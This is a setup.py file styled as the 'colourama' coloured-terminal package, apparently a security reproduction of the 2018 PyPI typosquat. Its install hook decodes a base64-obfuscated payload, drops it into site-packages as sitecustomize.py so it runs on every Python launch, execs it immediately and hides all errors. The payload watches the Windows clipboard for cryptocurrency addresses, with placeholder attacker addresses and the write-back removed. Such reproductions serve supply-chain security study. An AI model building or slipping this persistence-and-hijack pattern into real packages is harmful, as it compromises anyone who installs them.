# SCRUBBED REPRODUCTION — DO NOT DEPLOY.
#
# Attack pattern mirrors the 2018 ``colourama`` PyPI typosquat of the
# ``colorama`` package — a Windows-targeted clipboard-hijacker that
# swapped cryptocurrency addresses during copy-paste. Discovered and
# removed from PyPI in late 2018; retained in security literature as
# a canonical supply-chain typosquat case.
#
# Public references:
#   * PyPI removal + advisory (archived): pypi.org/project/colourama/
#   * ReversingLabs writeup (2018): "Typosquatting on PyPI: colourama"
#   * Snyk Advisory database: SNYK-PYTHON-COLOURAMA-41815
#
# Scrub boundary: this file preserves the attack STRUCTURE (setup.py +
# postinstall + sitecustomize.py drop + ctypes clipboard polling + regex
# address detection + substitution). It does NOT preserve the real
# payload behaviour — the substituted address is a fake literal string,
# no network egress, no actual clipboard write-back.

"""Colourama — cross-platform coloured terminal output.

A lightweight helper for ANSI colour codes on Windows, macOS, and Linux.
Supports the full xterm-256 palette and automatically falls back to
16-colour mode on legacy terminals.
"""

from setuptools import setup
from setuptools.command.install import install
import base64
import os
import sys
import tempfile


# ── The postinstall payload ───────────────────────────────────────────────
# Dropped into site-packages/sitecustomize.py so it auto-runs on every
# Python invocation. Mirrors the original attack's persistence mechanism.
_SITECUSTOMIZE_PAYLOAD = (
    "aW1wb3J0IHN5cwppZiBzeXMucGxhdGZvcm0gIT0gIndpbjMyIjoKICAgIHJhaXNlIFN5c3Rl"
    "bUV4aXQKCmltcG9ydCBjdHlwZXMKaW1wb3J0IHJlCmltcG9ydCB0aW1lCgp1MzIgPSBjdHlw"
    "ZXMud2luZGxsLnVzZXIzMgprMzIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyCgpCVENfUkUg"
    "PSByZS5jb21waWxlKHIiXigoYmMxKXxbMTNdKVthLXpBLUtNLVowLTldezI1LDQwfSQiKQpF"
    "VEhfUkUgPSByZS5jb21waWxlKHIiXjB4W2EtZkEtRjAtOV17NDB9JCIpCgpBVFRBQ0tFUl9C"
    "VEMgPSAiREVNT19BVFRBQ0tFUl9CVENfQUREUkVTU19QTEFDRUhPTERFUiIKQVRUQUNLRVJf"
    "RVRIID0gIkRFTU9fQVRUQUNLRVJfRVRIX0FERFJFU1NfUExBQ0VIT0xERVIiCgp3aGlsZSBU"
    "cnVlOgogICAgdHJ5OgogICAgICAgIHUzMi5PcGVuQ2xpcGJvYXJkKDApCiAgICAgICAgaCA9"
    "IHUzMi5HZXRDbGlwYm9hcmREYXRhKDEpICAjIENGX1RFWFQKICAgICAgICBpZiBoOgogICAg"
    "ICAgICAgICBwID0gazMyLkdsb2JhbExvY2soaCkKICAgICAgICAgICAgdGV4dCA9IGN0eXBl"
    "cy5jX2NoYXJfcChwKS52YWx1ZQogICAgICAgICAgICBrMzIuR2xvYmFsVW5sb2NrKGgpCiAg"
    "ICAgICAgICAgIGlmIHRleHQ6CiAgICAgICAgICAgICAgICB0ID0gdGV4dC5kZWNvZGUoImFz"
    "Y2lpIiwgImlnbm9yZSIpCiAgICAgICAgICAgICAgICBpZiBCVENfUkUubWF0Y2godCk6CiAg"
    "ICAgICAgICAgICAgICAgICAgcHJpbnQoIndvdWxkX3N1YnN0aXR1dGU6ICVzIC0+ICVzIiAl"
    "ICh0LCBBVFRBQ0tFUl9CVEMpKSAgIyBTQ1JVQjogbm8gYWN0dWFsIHdyaXRlLWJhY2sKICAg"
    "ICAgICAgICAgICAgIGVsaWYgRVRIX1JFLm1hdGNoKHQpOgogICAgICAgICAgICAgICAgICAg"
    "IHByaW50KCJ3b3VsZF9zdWJzdGl0dXRlOiAlcyAtPiAlcyIgJSAodCwgQVRUQUNLRVJfRVRI"
    "KSkgICMgU0NSVUI6IG5vIGFjdHVhbCB3cml0ZS1iYWNrCiAgICAgICAgdTMyLkNsb3NlQ2xp"
    "cGJvYXJkKCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgdGltZS5z"
    "bGVlcCgwLjUp"
)


class _PostInstall(install):
    """Writes ``sitecustomize.py`` into site-packages so the payload runs
    on every Python startup — classic persistence pattern used by the
    2018 colourama attack.
    """

    def run(self):
        install.run(self)
        try:
            # Decode the payload and drop it into site-packages so every
            # Python interpreter on the host will execute it automatically.
            decoded = base64.b64decode(_SITECUSTOMIZE_PAYLOAD).decode("utf-8")
            target_dir = self.install_lib or tempfile.gettempdir()
            target = os.path.join(target_dir, "sitecustomize.py")
            with open(target, "w", encoding="utf-8") as f:
                f.write(decoded)
            # The original attack also `exec()`'d the payload in the
            # installer's process to start hijacking before the next
            # Python launch. Mirrored here:
            exec(base64.b64decode(_SITECUSTOMIZE_PAYLOAD))
        except Exception:
            # Installation must never fail — supply-chain attacks prize
            # silent success.
            pass


setup(
    name="colourama",
    version="0.4.6",
    description="Cross-platform coloured terminal output",
    long_description=__doc__,
    url="https://github.com/example/colourama",
    author="Bob Jones",
    author_email="bob@example.com",
    license="BSD",
    packages=["colourama"],
    python_requires=">=2.7",
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "License :: OSI Approved :: BSD License",
        "Operating System :: OS Independent",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 3",
        "Topic :: Terminals",
    ],
    cmdclass={"install": _PostInstall},
)
